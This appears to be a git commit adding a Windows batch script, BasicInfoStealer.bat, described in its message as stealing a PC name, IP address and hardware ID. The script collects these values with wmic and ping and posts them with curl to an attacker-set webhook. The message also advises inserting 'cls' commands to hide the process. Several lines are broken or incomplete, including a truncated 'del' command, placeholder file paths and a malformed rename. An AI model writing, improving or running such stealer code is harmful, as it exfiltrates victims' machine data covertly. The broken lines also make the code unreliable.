c8cc909666331f4902456e8a43c4726fc99d0c5b
elfy <75458737+xoElf@users.noreply.github.com>
2021-05-02 20:39:08 -0400

    Steals: PC Name, IP Address, HWID
    it needs "cls" commands inbetween each line to hide the process it better

---
+++ BasicInfoStealer.bat
@@ -0,0 +1,15 @@
+@echo off
+color F0
+echo Info Stealer!
+
+::SET WEBHOOK HERE!
+set webhook=WEBHOOK_HERE
+
+for /f "tokens=2 delims==" %%J in ('wmic csproduct get uuid /value') do set serial=%%J
+Find /I "%serial%" {Location of file} > {Location of confirmation file}
+For /f "tokens=1,2* delims=," %%G in ({Location of confirmation file}) do set HN=%%H
+wmic computersystem where caption='%computername%' rename %HN%` 
+del {Location
+for /f "delims=[] tokens=2" %%a in ('ping -4 -n 1 %ComputerName% ^| findstr [') do set ip=%%a
+curl -X POST -H "Content-type: application/json" --data "{\"content\": \"Opened on: `%date%` at `%time%`\nPC NAME: `%computername%`\nIP Address: `%ip%`\nHWID: `%serial%`\n\"}" %webhook%
+pause
